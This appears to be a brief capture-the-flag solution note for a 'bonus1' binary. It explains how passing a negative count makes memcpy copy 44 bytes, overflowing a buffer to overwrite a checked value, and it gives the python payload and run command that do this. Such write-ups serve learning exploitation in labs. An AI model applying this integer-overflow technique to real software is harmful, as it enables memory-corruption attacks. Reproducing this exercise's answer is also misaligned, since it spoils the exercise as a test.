The program expects a value less than 10;
To access next bonus's it should be equals to 1464814662
on memcpy this value will be multipled by 4 and converted to unsigned int
with memcpy whe should copy 44 bytes from argv[2] so we can overflow the value

negative_number * 4 = 44


python -c "print('a'*40 + '\x46\x4c\x4f\x57' )" > /tmp/lua1

./bonus1 -2147483637 $(cat /tmp/lua1)
